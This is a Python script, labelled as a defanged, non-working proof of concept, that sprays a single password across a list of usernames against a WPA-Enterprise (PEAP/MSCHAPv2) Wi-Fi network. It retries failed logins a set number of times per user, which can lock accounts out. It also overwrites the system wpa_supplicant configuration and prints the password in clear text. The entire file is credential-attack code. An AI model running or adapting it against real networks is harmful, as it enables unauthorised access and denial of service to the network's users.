#defanged/not working poc. 
import subprocess
import os
import time

def install_dependencies():
    # Check if 'iw' package is installed
    result = subprocess.run(["iw", "--version"], capture_output=True, text=True)
    if result.returncode != 0:
        print("'iw' package not found. Installing...")
        subprocess.run(["sudo", "apt-get", "update"])
        subprocess.run(["sudo", "apt-get", "install", "iw"])

    # Check if 'wpa_supplicant' package is installed
    result = subprocess.run(["wpa_supplicant", "-v"], capture_output=True, text=True)
    if result.returncode != 0:
        print("'wpa_supplicant' package not found. Installing...")
        subprocess.run(["sudo", "apt-get", "update"])
        subprocess.run(["sudo", "apt-get", "install", "wpasupplicant"])

def read_password_from_file():
    # Derive the path to the password.txt file in the same directory as the script
    script_dir = os.path.dirname(os.path.realpath(__file__))
    password_file = os.path.join(script_dir, "password.txt")

    # Read the password from the file
    with open(password_file, 'r') as file:
        password = file.readline().strip()

    return password

def get_connected_ap_info():
    # Get the SSID and MAC address of the connected access point
    result = subprocess.run(["iwgetid", "--raw"], capture_output=True, text=True)
    ssid = result.stdout.strip()
    
    result = subprocess.run(["iwgetid", "--ap", "--raw"], capture_output=True, text=True)
    mac_address = result.stdout.strip()
    
    return ssid, mac_address

def authenticate(ssid, username, password, adapter):
    # Configure wpa_supplicant with the specified SSID and credentials
    wpa_conf = f"network={{\n  ssid=\"{ssid}\"\n  key_mgmt=WPA-EAP\n  eap=PEAP\n  identity=\"{username}\"\n  password=\"{password}\"\n  phase1=\"peapver=0\"\n  phase2=\"auth=MSCHAPV2\"\n}}"
    with open("/etc/wpa_supplicant/wpa_supplicant.conf", "w") as f:
        f.write(wpa_conf)

    # Restart wpa_supplicant to apply the new configuration
    subprocess.run(["sudo", "systemctl", "restart", "wpa_supplicant@" + adapter])
    time.sleep(2)  # Wait for wpa_supplicant to restart

    # Check if the connection is established
    result = subprocess.run(["iwgetid", "--raw"], capture_output=True, text=True)
    connected_ssid = result.stdout.strip()
    if connected_ssid == ssid:
        return True
    else:
        # Display additional information when authentication fails
        print(f"Authentication failed for SSID: {ssid}")
        print(f"Using password: {password}")
        print(f"MAC address of the access point: {get_connected_ap_info()[1]}")
        return False

def main():
    install_dependencies()

    # Prompt the operator for input
    network_name = input("Enter the wireless network name (SSID): ")
    num_attempts = int(input("Enter the number of times to fail authentication: "))
    adapter_name = input("Enter the name of the wireless network adapter to use: ")

    # Read the password from password.txt file
    password = read_password_from_file()

    # Derive the path to the users.txt file in the same directory as the script
    script_dir = os.path.dirname(os.path.realpath(__file__))
    users_file = os.path.join(script_dir, "users.txt")

    # Open and read the users.txt file
    with open(users_file, 'r') as file:
        users = file.readlines()

    # Strip newline characters from usernames
    users = [user.strip() for user in users]

    # Iterate through each user
    for user in users:
        print(f"Attempting authentication for user: {user}")
        for _ in range(num_attempts):
            if authenticate(network_name, user, password, adapter_name):
                print(f"Successfully authenticated as {user}")
                break
            else:
                print(f"Authentication failed for user {user}. Trying again...")
                time.sleep(1)  # Wait for 1 second before next attempt

if __name__ == "__main__":
    main()
